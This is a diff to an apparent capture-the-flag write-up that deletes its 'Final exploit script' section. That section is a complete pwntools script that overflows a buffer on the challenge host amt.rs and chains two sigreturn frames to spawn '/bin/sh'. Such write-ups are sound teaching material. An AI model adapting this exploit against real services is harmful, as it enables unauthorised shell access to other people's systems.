@@ -138,56 +138,6 @@ So the second payload is:
 
 After `rt_sigreturn` restores this frame, the kernel executes `execve("/bin/sh", NULL, NULL)` and we get a shell.
 
-## Final exploit script
-
-Here is a complete exploit script using pwntools:
-
-```python
-#!/usr/bin/env python3
-from pwn import *
-
-context.arch = 'amd64'
-context.os = 'linux'
-
-io = remote("amt.rs", 27193)
-
-# === Stage 1: SROP read into .bss ===
-frame = SigreturnFrame()
-frame.rax = 0                      # sys_read
-frame.rdi = 0                      # stdin
-frame.rsi = 0x00000000010d8100     # buffer in writable memory
-frame.rdx = 0x200                  # size
-frame.rsp = 0x00000000010d8100 - 48 + 8
-frame.rip = 0x0000000001038e9a     # syscall gadget
-
-payload1  = b"A" * 360
-payload1 += p64(0x00000000010c5cc4)   # pop rax ; ret
-payload1 += p64(0xf)                  # rax = 15 (rt_sigreturn)
-payload1 += p64(0x0000000001038e9a)   # syscall
-payload1 += bytes(frame)              # first SigreturnFrame
-payload1 += b"B" * 8
-
-io.sendline(payload1)
-
-# === Stage 2: SROP execve("/bin/sh") ===
-frame2 = SigreturnFrame()
-frame2.rax = 59                     # execve
-frame2.rdi = 0x00000000010d8100     # "/bin/sh" string
-frame2.rsi = 0
-frame2.rdx = 0
-frame2.rsp = 0x00000000010d9000
-frame2.rip = 0x0000000001038e9a     # syscall gadget
-
-payload2  = b"/bin/sh\x00"
-payload2 += p64(0x00000000010c5cc4)  # pop rax ; ret
-payload2 += p64(0xf)                 # rax = 15
-payload2 += p64(0x0000000001038e9a)  # syscall
-payload2 += bytes(frame2)           # second SigreturnFrame
-
-io.send(payload2)
-io.interactive()
-```
-
 Running this exploit against the remote service gives a shell, and then:
 
 ```sh
